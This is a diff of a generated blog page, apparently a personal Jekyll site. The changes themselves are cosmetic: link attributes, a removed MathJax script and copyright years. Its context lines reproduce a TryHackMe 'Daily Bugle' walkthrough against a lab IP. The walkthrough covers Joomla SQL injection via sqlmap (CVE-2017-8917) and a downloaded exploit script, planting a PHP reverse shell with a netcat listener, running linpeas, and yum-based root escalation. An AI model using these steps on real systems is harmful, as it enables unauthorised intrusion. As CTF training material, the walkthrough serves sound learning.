@@ -52,8 +52,9 @@
 
     <title>TryHackMe - Daily Bugle - Mr0Wido's Blog</title>
     <link rel="stylesheet" type="text/css" href="/assets/css/main.css">
-  <script src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">MathJax.Hub.Config({         tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']] }       });</script>
-</head>
+    
+  
+  </head>
   <body>
     <header class="site-header">
   <a class="site-logo" href="/"> <img src="/assets/img/icon-4.png" alt="logo"></a>
@@ -123,13 +124,13 @@
     <li><a class="site-nav__link " href="/categories/">Categories</a></li>
   </ul>
   <ul class="social ul-base">
-    <li><a href="https://twitter.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i></a></li>
-    <li><a href="https://instagram.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i></a></li>
-    <li><a href="https://www.linkedin.com/in/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i></a></li>
-    <li><a href="https://github.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i></a></li>
+    <li><a href="https://twitter.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i></a></li>
+    <li><a href="https://instagram.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i></a></li>
+    <li><a href="https://www.linkedin.com/in/" itemprop="sameAs" rel="nofollow noopener noreferrer me"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i></a></li>
+    <li><a href="https://github.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me"><i class="fab fa-fw fa-github" aria-hidden="true"></i></a></li>
   </ul>
   <div class="copyright">
-    <span> © Copyright 2024 Mr0Wido's Blog | Powered by Jekyll | <a href="/tos/">Terms of Service</a> | <a href="/disclaimer/">Disclaimer</a></span>
+    <span> © Copyright 2025 Mr0Wido's Blog | Powered by Jekyll | <a href="/tos/">Terms of Service</a> | <a href="/disclaimer/">Disclaimer</a></span>
   </div>
 </nav>
 <div class="overlay"></div>
@@ -211,7 +212,7 @@
 
 <p><img src="/assets/img/tryhackme/daily-bugle/search.png" alt="search"></p>
 
-<p>Yes, we found the vulnerability. <a href="https://www.exploit-db.com/exploits/42033" rel="external nofollow noopener" target="_blank">CVE-2017-8917</a>.</p>
+<p>Yes, we found the vulnerability. <a href="https://www.exploit-db.com/exploits/42033">CVE-2017-8917</a>.</p>
 
 <p><img src="/assets/img/tryhackme/daily-bugle/db.png" alt="db"></p>
 
@@ -219,12 +220,12 @@
 
 <p><img src="/assets/img/tryhackme/daily-bugle/sql.png" alt="sql"></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -u "http://10.10.139.115/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -u "http://10.10.139.115/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
 </code></pre></div></div>
 
 <p><img src="/assets/img/tryhackme/daily-bugle/sqlmap.png" alt="sqlmap"></p>
 
-<p>I will use the python script <a href="https://github.com/stefanlucas/Exploit-Joomla" rel="external nofollow noopener" target="_blank">here</a>.</p>
+<p>I will use the python script <a href="https://github.com/stefanlucas/Exploit-Joomla">here</a>.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
 $ python joomblah http://10.10.139.115/
@@ -267,7 +268,7 @@ $ python joomblah http://10.10.139.115/
 <p><img src="/assets/img/tryhackme/daily-bugle/step3.png" alt="step3"></p>
 
 <p>And we have reached the source files, and from here we can put our reverse shell in the index.php file.
-You can find the reverse shell <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" rel="external nofollow noopener" target="_blank">here</a>.</p>
+You can find the reverse shell <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">here</a>.</p>
 
 <p><img src="/assets/img/tryhackme/daily-bugle/step4.png" alt="step4"></p>
 
@@ -284,7 +285,7 @@ You can find the reverse shell <a href="https://raw.githubusercontent.com/pentes
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
 </code></pre></div></div>
 
-<p>Now browse <a href="http://10.10.139.115/templates/beez3/index.php" rel="external nofollow noopener" target="_blank">http://10.10.139.115/templates/beez3/index.php</a> and you should get a reverse shell.</p>
+<p>Now browse <a href="http://10.10.139.115/templates/beez3/index.php">http://10.10.139.115/templates/beez3/index.php</a> and you should get a reverse shell.</p>
 
 <p>And we are inside.</p>
 
@@ -294,7 +295,7 @@ You can find the reverse shell <a href="https://raw.githubusercontent.com/pentes
 
 <p><img src="/assets/img/tryhackme/daily-bugle/ls.png" alt="ls"></p>
 
-<p>I tried to enter the jjameson directory but it didn’t work. So I decided to download <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230312" rel="external nofollow noopener" target="_blank">linpeas.sh</a> and run it on the target machine.</p>
+<p>I tried to enter the jjameson directory but it didn’t work. So I decided to download <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230312">linpeas.sh</a> and run it on the target machine.</p>
 
 <p>First I set up my own machine. I am running the following code in the directory where the linpeas.sh file is located.</p>
 
@@ -337,7 +338,7 @@ $ cat user.txt
 
 <p><img src="/assets/img/tryhackme/daily-bugle/yum.png" alt="yum"></p>
 
-<p>I’m looking at <a href="https://gtfobins.github.io/gtfobins/yum/" rel="external nofollow noopener" target="_blank">gftobins</a> to get root privileges using yum.</p>
+<p>I’m looking at <a href="https://gtfobins.github.io/gtfobins/yum/">gftobins</a> to get root privileges using yum.</p>
 
 <p>And let’s try this.</p>
 
@@ -394,7 +395,7 @@ $ cat root.txt
 </div>
 <br>
 <!-- Twitter Share Button -->
-<a href="https://twitter.com/intent/tweet?text=TryHackMe%20-%20Daily%20Bugle&amp;url=http://localhost:4000/tryhackme-daily-bugle/&amp;via=Mr0Wido" target="_blank" rel="noopener noreferrer" class="share-btn tweet-btn" title="Share on Twitter">
+<a href="https://twitter.com/intent/tweet?text=TryHackMe%20-%20Daily%20Bugle&url=http://localhost:4000/tryhackme-daily-bugle/&amp;via=Mr0Wido" target="_blank" rel="noopener noreferrer" class="share-btn tweet-btn" title="Share on Twitter">
     Tweet
 </a>
   
@@ -423,7 +424,7 @@ $ cat root.txt
     (d.head || d.body).appendChild(s);
     })();
 </script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="external nofollow noopener" target="_blank">comments powered by Disqus.</a>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
 </noscript>
 
 
@@ -459,23 +460,23 @@ $ cat root.txt
         
           
             
-              <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+              <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
             
           
             
-              <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+              <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
             
           
             
-              <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+              <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
             
           
             
-              <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
+              <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
             
           
             
-              <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+              <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
             
           
         
@@ -531,23 +532,23 @@ $ cat root.txt
           
             
               
-                <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+                <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
               
             
               
-                <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+                <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
               
             
               
-                <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+                <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
               
             
               
-                <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
+                <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
               
             
               
-                <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+                <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
               
             
           
@@ -625,23 +626,23 @@ $ cat root.txt
         
           
             
-              <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+              <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
             
           
             
-              <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+              <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
             
           
             
-              <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+              <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
             
           
             
-              <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
+              <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
             
           
             
-              <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+              <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
             
           
         
@@ -697,23 +698,23 @@ $ cat root.txt
           
             
               
-                <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+                <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
               
             
               
-                <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+                <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
               
             
               
-                <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+                <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
               
             
               
-                <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
+                <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
               
             
               
-                <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+                <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
               
             
           
@@ -835,7 +836,7 @@ $ cat root.txt
 
 <p><img src="/assets/img/tryhackme/daily-bugle/search.png" alt="search"></p>
 
-<p>Yes, we found the vulnerability. <a href="https://www.exploit-db.com/exploits/42033" rel="external nofollow noopener" target="_blank">CVE-2017-8917</a>.</p>
+<p>Yes, we found the vulnerability. <a href="https://www.exploit-db.com/exploits/42033">CVE-2017-8917</a>.</p>
 
 <p><img src="/assets/img/tryhackme/daily-bugle/db.png" alt="db"></p>
 
@@ -843,12 +844,12 @@ $ cat root.txt
 
 <p><img src="/assets/img/tryhackme/daily-bugle/sql.png" alt="sql"></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -u "http://10.10.139.115/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -u "http://10.10.139.115/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
 </code></pre></div></div>
 
 <p><img src="/assets/img/tryhackme/daily-bugle/sqlmap.png" alt="sqlmap"></p>
 
-<p>I will use the python script <a href="https://github.com/stefanlucas/Exploit-Joomla" rel="external nofollow noopener" target="_blank">here</a>.</p>
+<p>I will use the python script <a href="https://github.com/stefanlucas/Exploit-Joomla">here</a>.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
 $ python joomblah http://10.10.139.115/
@@ -891,7 +892,7 @@ $ python joomblah http://10.10.139.115/
 <p><img src="/assets/img/tryhackme/daily-bugle/step3.png" alt="step3"></p>
 
 <p>And we have reached the source files, and from here we can put our reverse shell in the index.php file.
-You can find the reverse shell <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" rel="external nofollow noopener" target="_blank">here</a>.</p>
+You can find the reverse shell <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">here</a>.</p>
 
 <p><img src="/assets/img/tryhackme/daily-bugle/step4.png" alt="step4"></p>
 
@@ -908,7 +909,7 @@ You can find the reverse shell <a href="https://raw.githubusercontent.com/pentes
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
 </code></pre></div></div>
 
-<p>Now browse <a href="http://10.10.139.115/templates/beez3/index.php" rel="external nofollow noopener" target="_blank">http://10.10.139.115/templates/beez3/index.php</a> and you should get a reverse shell.</p>
+<p>Now browse <a href="http://10.10.139.115/templates/beez3/index.php">http://10.10.139.115/templates/beez3/index.php</a> and you should get a reverse shell.</p>
 
 <p>And we are inside.</p>
 
@@ -918,7 +919,7 @@ You can find the reverse shell <a href="https://raw.githubusercontent.com/pentes
 
 <p><img src="/assets/img/tryhackme/daily-bugle/ls.png" alt="ls"></p>
 
-<p>I tried to enter the jjameson directory but it didn’t work. So I decided to download <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230312" rel="external nofollow noopener" target="_blank">linpeas.sh</a> and run it on the target machine.</p>
+<p>I tried to enter the jjameson directory but it didn’t work. So I decided to download <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230312">linpeas.sh</a> and run it on the target machine.</p>
 
 <p>First I set up my own machine. I am running the following code in the directory where the linpeas.sh file is located.</p>
 
@@ -961,7 +962,7 @@ $ cat user.txt
 
 <p><img src="/assets/img/tryhackme/daily-bugle/yum.png" alt="yum"></p>
 
-<p>I’m looking at <a href="https://gtfobins.github.io/gtfobins/yum/" rel="external nofollow noopener" target="_blank">gftobins</a> to get root privileges using yum.</p>
+<p>I’m looking at <a href="https://gtfobins.github.io/gtfobins/yum/">gftobins</a> to get root privileges using yum.</p>
 
 <p>And let’s try this.</p>
 
@@ -1018,7 +1019,7 @@ $ cat root.txt
 </div>
 <br>
 <!-- Twitter Share Button -->
-<a href="https://twitter.com/intent/tweet?text=TryHackMe%20-%20Daily%20Bugle&amp;url=http://localhost:4000/tryhackme-daily-bugle/&amp;via=Mr0Wido" target="_blank" rel="noopener noreferrer" class="share-btn tweet-btn" title="Share on Twitter">
+<a href="https://twitter.com/intent/tweet?text=TryHackMe%20-%20Daily%20Bugle&url=http://localhost:4000/tryhackme-daily-bugle/&amp;via=Mr0Wido" target="_blank" rel="noopener noreferrer" class="share-btn tweet-btn" title="Share on Twitter">
     Tweet
 </a>
   
@@ -1047,7 +1048,7 @@ $ cat root.txt
     (d.head || d.body).appendChild(s);
     })();
 </script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="external nofollow noopener" target="_blank">comments powered by Disqus.</a>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
 </noscript>
 
 
@@ -1062,7 +1063,7 @@ $ cat root.txt
     <button onclick="topFunction()" id="myBtn" title="Go to top"><i class="fas fa-chevron-circle-up fa-2x"></i></button>
     <footer>
   <div class="footer">
-    © Copyright 2024 Mr0Wido's Blog | Powered by Jekyll | <a href="/tos/">Terms of Service</a> | <a href="/disclaimer/">Disclaimer</a>
+    © Copyright 2025 Mr0Wido's Blog | Powered by Jekyll | <a href="/tos/">Terms of Service</a> | <a href="/disclaimer/">Disclaimer</a>
   </div>
 </footer>
 
